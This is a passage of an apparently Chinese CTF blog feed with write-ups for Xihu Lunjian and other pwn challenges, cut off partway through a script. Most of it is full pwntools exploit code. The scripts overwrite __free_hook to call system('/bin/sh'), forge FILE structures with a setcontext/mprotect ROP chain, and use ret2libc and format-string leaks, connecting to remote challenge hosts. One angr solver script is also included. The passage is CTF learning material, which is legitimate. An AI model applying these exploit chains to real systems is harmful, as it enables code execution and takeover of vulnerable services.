class="hljs-number">2</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, <span class="hljs-string">b&#x27;\x40&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x50</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(<span class="hljs-number">0x461</span>))<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    <br>    add(<span class="hljs-number">3</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, <span class="hljs-string">b&#x27;\xa0&#x27;</span> + <span class="hljs-string">b&#x27;\x86&#x27;</span>)<br>    add(<span class="hljs-number">4</span>, <span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>    edit(-<span class="hljs-number">60</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-comment">#p.recvuntil(b&#x27;\x7f&#x27;, timeout=1)</span><br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) + <span class="hljs-number">0xd20</span><br>    libc_base = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    sys_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>    <span class="hljs-keyword">if</span> libc_base &lt; <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span><br>    <br>    sleep(<span class="hljs-number">4</span>)<br>    delete(<span class="hljs-number">0</span>)<br>    delete(<span class="hljs-number">1</span>)<br>    edit(-<span class="hljs-number">62</span>, p64(free_hook))<br>    add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>    add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>, p64(sys_addr))<br>    delete(<span class="hljs-number">0</span>)<br>    p.interactive()<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br><span class="hljs-comment">#pwn()</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./pwn4&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">21795</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h1 id="tototo"><a href="#tototo" class="headerlink" title="tototo"></a>tototo</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./tototo&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;libc-2.31.so&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./tototo&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;121.40.89.206&#x27;</span>, <span class="hljs-number">36789</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;content?&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;one?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cadd</span>(<span class="hljs-params">index, size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index?&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;size?&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br>cadd(<span class="hljs-number">0</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">1</span>, <span class="hljs-number">0x420</span>)<br>cadd(<span class="hljs-number">2</span>, <span class="hljs-number">0x200</span>)<br>cadd(<span class="hljs-number">3</span>, <span class="hljs-number">0x410</span>)<br>cadd(<span class="hljs-number">4</span>, <span class="hljs-number">0x200</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x2a0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_addr))<br><br>delete(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span><br>libc_base = leak - libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>IO_wfile_jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>pop_rdi_ret = libc_base + <span class="hljs-number">0x26b72</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x27529</span><br>pop_rdx_r12_ret = libc_base + <span class="hljs-number">0x11c371</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br><br>cadd(<span class="hljs-number">5</span>, <span class="hljs-number">0x430</span>)<br>delete(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">1</span>, payload)<br>cadd(<span class="hljs-number">6</span>, <span class="hljs-number">0x430</span>)<br><br>fake_addr = heap_addr + <span class="hljs-number">0xae0</span><br>fake_IO_FILE = <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">7</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x58</span><br>fake_IO_FILE += p64(heap_addr)             <span class="hljs-comment">#_lock</span><br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x10</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(IO_wfile_jumps)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x68</span><br>fake_IO_FILE += p64(setcontext + <span class="hljs-number">61</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0x200</span>)<br>fake_IO_FILE += p64(ret)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x30</span><br>fake_IO_FILE += p64(fake_addr + <span class="hljs-number">0xe0</span>)<br>fake_IO_FILE += <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">0x38</span><br><br>payload = fake_IO_FILE<br>payload += flat(<br>    p64(pop_rdi_ret), p64(heap_addr),<br>    p64(pop_rsi_ret), p64(<span class="hljs-number">0x1000</span>),<br>    p64(pop_rdx_r12_ret), p64(<span class="hljs-number">7</span>), p64(<span class="hljs-number">0</span>),<br>    p64(mprotect),<br>    p64(fake_addr + <span class="hljs-number">0x248</span>)<br>)<br><br>payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>))<br>edit(<span class="hljs-number">3</span>, payload)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendlineafter(<span class="hljs-string">b&#x27;is:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>è¥¿æ¹–è®ºå‰‘-pwn</title>
    <link href="/2023/02/07/xhlj-pwn/"/>
    <url>/2023/02/07/xhlj-pwn/</url>
    
    <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“è¥¿æ¹–è®ºå‰‘ï¼Œåªåšå‡ºäº†ä¸¤é“pwné¢˜ï¼Œé‚£ä¸ªjitåˆ°æœ€åä¹Ÿæ²¡èƒ½çœ‹æ˜ç™½ğŸ˜ã€‚</p><h3 id="babycalc"><a href="#babycalc" class="headerlink" title="babycalc"></a>babycalc</h3><p>å¦‚ä¸‹å›¾ï¼Œè¾“å…¥0x100å¤§å°çš„æ•°æ®å¯ä»¥ä¿®æ”¹æ ˆä¸Š<code>i</code>çš„å€¼ï¼Œé€šè¿‡<code>i</code>ä¸v3çš„åç§»å°±å¯ä»¥ä¿®æ”¹æ ˆä¸Šçš„ä»»æ„ä¸€å­—èŠ‚ï¼Œè€Œä¸”è¾“å…¥åå­˜åœ¨off-by-one</p><p><img src="/img/11/Screenshot_20230208_111806.png"></p><p>â€‹</p><p>è¿™é‡Œåˆ©ç”¨<code>i</code>ä¸v3çš„åç§»ä¿®æ”¹è¿”å›å€¼ä¸º <code>leave ret</code>çš„åœ°å€ï¼Œåªèƒ½æ›´æ”¹ä¸€å­—èŠ‚ï¼Œè¿™é‡Œä¿®æ”¹ä¸º0x400C18ï¼Œåˆ©ç”¨off-by-oneæ”¹å˜rbpçš„å€¼æ¥å®ç°æ ˆè¿ç§»ï¼Œå…·ä½“æ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/img/11/Screenshot_20230209_124709.jpg" style="zoom:80%;" /><p>â€‹</p><p>ç”±äºæ ˆæ¯æ¬¡å¯åŠ¨çš„åœ°å€ä¸åŒï¼Œè¿˜éœ€è¦çˆ†ç ´æ ˆåœ°å€ï¼Œå†ret2libcã€‚</p><p>â€‹</p><p>æœ€åå°±æ˜¯å…³äºä¸­é—´é‚£ä¸ªæ–¹ç¨‹ç»„çš„æ±‚è§£ï¼Œæˆ‘å½“æ—¶æ˜¯ç›´æ¥å¤´é“ç¡¬ç®—çš„(å…¶å®è¿˜æ¯”è¾ƒå¥½ç®—)ï¼Œèµ›åå¬è¯´angrä¹Ÿèƒ½å°†ç»“æœè·‘å‡ºæ¥ï¼Œè‡ªå·±ä¹Ÿå°è¯•åšäº†ä¸€ä¸‹angrçš„è§£æ³•:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Go</span>():<br>    proj = angr.Project(<span class="hljs-string">&#x27;./babycalc&#x27;</span>)<br>    <br>    start_addr = <span class="hljs-number">0x40080a</span><br>    init_state = proj.factory.blank_state(addr = start_addr)<br>    init_state.regs.rbp = init_state.regs.rsp<br>    init_state.regs.rsp -= <span class="hljs-number">0x100</span><br><br>    v3 = claripy.BVS(<span class="hljs-string">&#x27;v3&#x27;</span>, <span class="hljs-number">8</span>)<br>    v4 = claripy.BVS(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v5 = claripy.BVS(<span class="hljs-string">&#x27;v5&#x27;</span>, <span class="hljs-number">8</span>)<br>    v6 = claripy.BVS(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">8</span>)<br>    v7 = claripy.BVS(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">8</span>)<br>    v8 = claripy.BVS(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">8</span>)<br>    v9 = claripy.BVS(<span class="hljs-string">&#x27;v9&#x27;</span>, <span class="hljs-number">8</span>)<br>    v10 = claripy.BVS(<span class="hljs-string">&#x27;v10&#x27;</span>, <span class="hljs-number">8</span>)<br>    v11 = claripy.BVS(<span class="hljs-string">&#x27;v11&#x27;</span>, <span class="hljs-number">8</span>)<br>    v12 = claripy.BVS(<span class="hljs-string">&#x27;v12&#x27;</span>, <span class="hljs-number">8</span>)<br>    v13 = claripy.BVS(<span class="hljs-string">&#x27;v13&#x27;</span>, <span class="hljs-number">8</span>)<br>    v14 = claripy.BVS(<span class="hljs-string">&#x27;v14&#x27;</span>, <span class="hljs-number">8</span>)<br>    v15 = claripy.BVS(<span class="hljs-string">&#x27;v15&#x27;</span>, <span class="hljs-number">8</span>)<br>    v16 = claripy.BVS(<span class="hljs-string">&#x27;v16&#x27;</span>, <span class="hljs-number">8</span>)<br>    v17 = claripy.BVS(<span class="hljs-string">&#x27;v17&#x27;</span>, <span class="hljs-number">8</span>)<br>    v18 = claripy.BVS(<span class="hljs-string">&#x27;v18&#x27;</span>, <span class="hljs-number">8</span>)<br>    val = [v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18]<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>        stack_addr = init_state.regs.rbp - <span class="hljs-number">0x30</span> + i<br>        init_state.memory.store(stack_addr, val[i])<br><br>    simgr = proj.factory.simgr(init_state)<br>    find_addr = <span class="hljs-number">0x400ba1</span><br>    simgr.explore(find = find_addr)<br>    <span class="hljs-keyword">if</span> simgr.found:<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            real_val = solution_state.solver.<span class="hljs-built_in">eval</span>(val[i])<br>            <span class="hljs-built_in">print</span>(real_val)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find!&#x27;</span>)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Go()<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="/img/11/Screenshot_20230216_102443.png"></p><p>ğŸ˜‹å¥½ç¥å¥‡ï¼angrçœŸæ»´å¼ºï¼</p><p>â€‹</p><p>å®Œæ•´exp</p><p>è¿œç¨‹libcä¸º2.23-0ubuntu11.3_amd64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;babycalc&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span><br><span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br><span class="hljs-keyword">global</span> p<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    pop_rdi = <span class="hljs-number">0x400ca3</span><br>    ret = pop_rdi + <span class="hljs-number">1</span><br>    rop1 = p64(pop_rdi) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(ret) * <span class="hljs-number">0x10</span> +  p64(<span class="hljs-number">0x400650</span>) <span class="hljs-comment">#</span><br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop1<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br><br>    p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br>    sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br><br>    rop2 = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br><br>    payload = <span class="hljs-string">b&#x27;24\n&#x27;</span>.ljust(<span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += rop2<br>    payload = payload.ljust(<span class="hljs-number">0xd0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p8(<span class="hljs-number">19</span>) + p8(<span class="hljs-number">36</span>) + p8(<span class="hljs-number">53</span>) + p8(<span class="hljs-number">70</span>) + p8(<span class="hljs-number">55</span>) + p8(<span class="hljs-number">66</span>) + p8(<span class="hljs-number">17</span>) + p8(<span class="hljs-number">161</span>)<br>    payload += p8(<span class="hljs-number">50</span>) + p8(<span class="hljs-number">131</span>) + p8(<span class="hljs-number">212</span>) + p8(<span class="hljs-number">101</span>) + p8(<span class="hljs-number">118</span>) + p8(<span class="hljs-number">199</span>) + p8(<span class="hljs-number">24</span>) + p8(<span class="hljs-number">3</span>)<br>    payload = payload.ljust(<span class="hljs-number">0xf8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p32(<span class="hljs-number">0</span>) + p32((<span class="hljs-number">0x38</span>))<br><br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    p.sendafter(<span class="hljs-string">b&#x27;number&#x27;</span>, payload)<br>    <span class="hljs-comment">#pause()</span><br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#p = process(&#x27;./babycalc&#x27;)</span><br>        p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">26087</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><h3 id="Message-Board"><a href="#Message-Board" class="headerlink" title="Message Board"></a>Message Board</h3><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„æ¼<code>__libc_start_main</code>å‡½æ•°åœ°å€ï¼Œåˆ©ç”¨æ ˆè¿ç§»åˆ°bssæ®µç»§ç»­æ‰§è¡ŒROPï¼Œä½¿ç”¨mprotectå‡½æ•°æ›´æ”¹bssçš„æ‰§è¡Œæƒé™ï¼Œæœ€åæ‰§è¡Œshellcodeã€‚</p><p>â€‹</p><p>å®Œæ•´exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&#x27;tcp.cloud.dasctf.com&#x27;</span>,<span class="hljs-number">22429</span>)<br>context.log_level=<span class="hljs-string">&quot;debug&quot;</span> <br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;pwn&#x27;</span>)<br>libc = elf.libc<br><br>bss = <span class="hljs-number">0x4040b0</span><br>pop_rdi = <span class="hljs-number">0x401413</span><br>leave_ret = <span class="hljs-number">0x4012e1</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Welcome to DASCTF message board, please leave your name:&#x27;</span>,<span class="hljs-string">b&#x27;%31$p&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>leak = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>, drop=<span class="hljs-literal">True</span>), <span class="hljs-number">16</span>)<br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>mprotect = libcbase + 